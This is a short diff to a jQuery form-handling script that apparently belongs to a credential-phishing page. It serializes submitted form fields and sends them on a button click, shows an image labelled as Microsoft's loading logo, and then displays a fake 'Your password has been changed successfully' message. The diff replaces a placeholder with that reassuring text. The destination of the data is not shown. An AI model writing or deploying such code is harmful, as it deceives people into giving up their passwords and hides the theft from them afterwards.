@@ -1,4 +1,5 @@
 
+
 $.fn.serializeObject = function() {
     var obj = {};
     var arr = this.serializeArray();
@@ -33,30 +34,12 @@ $("button#sender").on('click',function(e){
         }
     });
     $("body").html("<img style='text-align:center; display:block; margin: 100px auto;' src='301.gif' alt='Microsoft\'s loading logo' />");
-    
-    
+
+
     var timeoutED = window.setTimeout(function(){
-        $("body").html("<h2>Yo</h2>");
-    }, 2000);
-    
-    
-    
-    
+        $("body").html('<p style="font-weight: 200; font-family: "Roboto",sans-serif; letter-spacing: 1.5px">Your password has been changed successfully</p>');
+    }, 800);
+
 });
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
